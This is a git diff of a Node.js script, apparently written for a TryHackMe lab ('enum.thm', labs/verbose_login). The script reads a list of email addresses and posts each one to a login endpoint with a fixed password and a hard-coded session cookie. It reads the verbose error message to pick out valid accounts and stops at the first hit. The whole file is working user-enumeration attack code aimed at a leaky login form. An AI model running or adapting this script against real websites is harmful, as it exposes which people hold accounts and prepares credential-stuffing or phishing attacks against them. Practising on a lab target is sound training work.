@@ -1,61 +1,74 @@
-import fs from 'node:fs/promises'
-import { URL } from 'node:url';
+import fs from 'node:fs/promises';
 
 const emailListFilePath = process.argv[2];
 
 if (!emailListFilePath) {
-    throw new Error("Email not provided!");
+    throw new Error("Email list file path not provided!");
 }
-
-async function checkEmail(email) {
-    if (!email) {
-        throw new Error("Email not provided!");
-        return false;
-    }
-    const url = new URL('http://enum.thm/labs/verbose_login/functions.php');
-    const refererURL = "http://enum.thm/labs/verbose_login/"
-    const headers = {
-        'Host': url.host,
-        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'X-Requested-With': 'XMLHttpRequest',
-        'Origin': url.origin,
-        'Connection': 'close',
-        'Referer': refererURL,
-    };
-    const data = {
-        'username': email,
-        'password': 'password',  // Use a random password as we are only checking the email
-        'function': 'login'
-    };
-
-    try {
-        const response = await fetch(url, {
-            headers: headers,
-            data: data,
-        });
-
-        return await response.json();
-    } catch (error) {
-        throw new Error("Unable tp fetch URL!");
-        return false;
-    }
-};
 
 async function enumerateEmail(emailFile) {
     if (!emailFile) {
-        throw new Error("Email not provided!");
-        return false;
+        throw new Error("Email file not provided!");
     }
-    // read email list
-    const text = await fs.readFile(emailFile, { encoding: "utf-8" });
-    const arrayOfEmails = text.split("\n");
 
-    arrayOfEmails.forEach(async (email) => {
-        console.log(await checkEmail(email));
-    })
-};
+    // Read email list
+    const text = await fs.readFile(emailFile, { encoding: "utf-8" });
+    // Split by newline and filter out empty lines
+    const arrayOfEmails = text.split("\n").map(e => e.trim()).filter(Boolean);
+    let attempt = 0;
+    // Use a for...of loop to properly handle async/await sequentially
+    for (const email of arrayOfEmails) {
+        const headers = {
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "Accept-Encoding": "gzip, deflate",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Cache-Control": "no-cache",
+            "Connection": "keep-alive",
+            // Content-Length removed so fetch calculates it dynamically
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Cookie": "PHPSESSID=htjn2gi594r2iltri35m8q700a",
+            "Pragma": "no-cache",
+            "Sec-GPC": "1",
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
+            "X-Requested-With": "XMLHttpRequest"
+        };
+
+        // Format data as URL-encoded to match Content-Type
+        const bodyData = new URLSearchParams({
+            'username': email,
+            'password': 'password',
+            'function': 'login'
+        });
+
+        try {
+            const response = await fetch("http://10.48.166.66/labs/verbose_login/functions.php", {
+                method: "POST",
+                headers: headers,
+                body: bodyData.toString(), // URL-encoded string
+            });
+
+            if (!response.ok) {
+                console.error(`HTTP error! status: ${response.status}`);
+                continue;
+            }
+
+            const jsonResponse = await response.json();
+            if (jsonResponse["message"] === "Email does not exist") {
+                console.log("--------------------")
+                console.log(`Attempt Count - ${attempt++}`)
+                console.log(`INVALID EMAIL- [${email}]`);
+                console.log("--------------------")
+                continue;
+            }
+            console.log("--------------------")
+            console.log(`Attempt Count - ${attempt++}`)
+            console.log(`VALID EMAIL FOUND- [${email}]`);
+            console.log("--------------------")
+            break;
+        } catch (error) {
+            console.error(`Error processing email ${email}:`, error.message);
+        }
+    }
+}
+
 await enumerateEmail(emailListFilePath);
